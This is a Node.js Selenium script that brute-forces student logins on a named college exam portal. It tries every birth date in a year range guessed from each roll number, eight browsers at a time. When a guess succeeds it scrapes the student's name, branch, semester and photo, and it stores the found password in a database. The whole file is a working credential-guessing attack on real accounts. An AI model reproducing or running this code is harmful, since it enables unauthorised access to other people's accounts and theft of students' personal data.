const { Builder, By } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const moment = require('moment');
const prisma = require("./prismaClient");

class Semaphore {
    constructor(max) {
        this.max = max;
        this.count = 0;
        this.queue = [];
    }

    async acquire() {
        if (this.count < this.max) {
            this.count++;
            return Promise.resolve();
        }

        return new Promise(resolve => {
            this.queue.push(resolve);
        });
    }

    release() {
        this.count--;
        if (this.queue.length > 0) {
            this.count++;
            const next = this.queue.shift();
            next();
        }
    }
}

// Track which roll numbers are currently being processed
class ProcessingTracker {
    constructor() {
        this.processingRollNumbers = new Set();
    }

    isProcessing(roll_number) {
        return this.processingRollNumbers.has(roll_number);
    }

    startProcessing(roll_number) {
        this.processingRollNumbers.add(roll_number);
    }

    finishProcessing(roll_number) {
        this.processingRollNumbers.delete(roll_number);
    }
}

const processingTracker = new ProcessingTracker();
const semaphore = new Semaphore(8);

// Helper functions remain the same
async function tryPassword(driver, roll_number, password) {
    try {
        console.log(`Trying password: ${password} for User ID: ${roll_number}`);

        await driver.findElement(By.id('txtUserId')).clear();
        await driver.findElement(By.id('txtUserId')).sendKeys(roll_number);
        await driver.findElement(By.id('txtPwd')).clear();
        await driver.findElement(By.id('txtPwd')).sendKeys(password);
        await driver.findElement(By.id('btnLogin')).click();
        await driver.sleep(2000);

        const warningElements = await driver.findElements(By.id('lblWarning'));
        if (warningElements.length > 0) {
            const text = await warningElements[0].getText();
            if (text === 'Password is Incorrect') {
                return null;
            }
        }

        // If login is successful
        const imgSrc = await driver.findElement(By.id('ImgStudent')).getAttribute('src');
        const rollNumber = await driver.findElement(By.id('lblHTNo')).getText();
        const name = await driver.findElement(By.id('lblStudName')).getText();
        const branch = await driver.findElement(By.id('lblBranch')).getText();
        const sem = await driver.findElement(By.id('lblSem')).getText();

        return {
            rollNumber,
            name,
            branch,
            sem,
            imgSrc,
            password
        };
    } catch (error) {
        console.error(`Error trying password for ${roll_number}:`, error.message);
        return null;
    }
}

async function initializeDriver() {
    const options = new chrome.Options();
    options.addArguments('--disable-gpu', '--no-sandbox');
    const driver = await new Builder()
        .forBrowser('chrome')
        .setChromeOptions(options)
        .build();
    
    try {
        await driver.get('https://mgitexams.in');
        await driver.sleep(3000);
        await driver.findElement(By.id('lnkLogins')).click();
        await driver.sleep(3000);
        await driver.findElement(By.id('lnkStudent')).click();
        await driver.sleep(3000);
        return driver;
    } catch (error) {
        console.error('Error initializing driver:', error);
        await driver.quit();
        throw error;
    }
}

async function processRollNumber(roll_number) {
    if (processingTracker.isProcessing(roll_number)) {
        return null;
    }

    await semaphore.acquire();
    let driver;
    
    try {
        processingTracker.startProcessing(roll_number);
        driver = await initializeDriver();
        
        const prefix = roll_number.substring(0, 2);
        const yearList = generateYearList(prefix);
        
        for (const year of yearList) {
            console.log(`Processing ${roll_number} for year ${year}`);
            const dates = generateDateRange(year);
            
            for (const date of dates) {
                const result = await tryPassword(driver, roll_number, date);
                if (result) {
                    console.log(`Password found for ${roll_number}: ${date}`);
                    await prisma.student.update({
                        where: { roll_number },
                        data: {
                            status: "completed",
                            password: date
                        }
                    });
                    return true;
                }
            }
        }
        
        // If no password found
        await prisma.student.update({
            where: { roll_number },
            data: { status: "failed" }
        });
        return false;
    } catch (error) {
        console.error(`Error processing ${roll_number}:`, error);
        return false;
    } finally {
        if (driver) {
            await driver.quit();
        }
        processingTracker.finishProcessing(roll_number);
        semaphore.release();
    }
}

function generateDateRange(year) {
    const dates = [];
    const startDate = moment(`${year}-01-01`);
    const endDate = moment(`${year}-12-31`);
    
    let currentDate = startDate.clone();
    while (currentDate.isSameOrBefore(endDate)) {
        dates.push(currentDate.format('DD/MM/YYYY'));
        currentDate.add(1, 'days');
    }
    
    return dates;
}

function generateYearList(prefix) {
    let yearList = [];
    if(prefix === "17") {
        yearList = ["2000", "2001", "1999", "2002", "1998", "1997", "2003", "1996", "1995", "2004", "1994"]
    }
    else if(prefix === "18") {
        yearList = ["2001", "2002", "2000", "2003", "1999", "1998", "2004", "1997", "1996", "2005", "1995"]
    }
    else if(prefix === "19") {
        yearList = ["2002", "2003", "2001", "2004", "2000", "1999", "2005", "1998", "1997", "2006", "1996"]
    }
    else if(prefix === "20") {
        yearList = ["2003", "2004", "2002", "2005", "2001", "2000", "2006", "1999", "1998", "2007", "1997"]
    }
    else if(prefix === "21") {
        yearList = ["2004", "2005", "2003", "2006", "2002", "2001", "2007", "2000", "1999", "2008", "1998"]
    }
    else if(prefix === "22") {
        yearList = ["2005", "2006", "2004", "2007", "2003", "2002", "2008", "2001", "2000", "2009", "1999"]
    }
    else if(prefix === "23") {
        yearList = ["2006", "2007", "2005", "2008", "2004", "2003", "2009", "2002", "2001", "2010", "2000"]
    }
    else if(prefix === "24") {
        yearList = ["2007", "2008", "2006", "2009", "2005", "2004", "2010", "2003", "2002", "2011", "2001"]
    }
    return yearList;
}

async function main() {
    while (true) {
        try {
            // Get 5 pending students that aren't currently being processed
            const students = await prisma.student.findMany({
                where: {
                    status: "pending",
                    roll_number: {
                        notIn: Array.from(processingTracker.processingRollNumbers)
                    }
                },
                orderBy: { createdAt: "asc" },
                take: 8,
            });

            if (students.length === 0) {
                console.log("No more pending students to process");
                break;
            }

            // Update status to processing for all selected students
            await Promise.all(students.map(student => 
                prisma.student.update({
                    where: { roll_number: student.roll_number },
                    data: { status: "processing" }
                })
            ));

            // Process students in parallel
            await Promise.all(students.map(student => 
                processRollNumber(student.roll_number)
            ));

        } catch (error) {
            console.error("Error in main loop:", error);
            await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before retrying
        }
    }
}

// Handle cleanup on exit
process.on('SIGINT', async () => {
    console.log('Gracefully shutting down...');
    process.exit(0);
});

main().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
});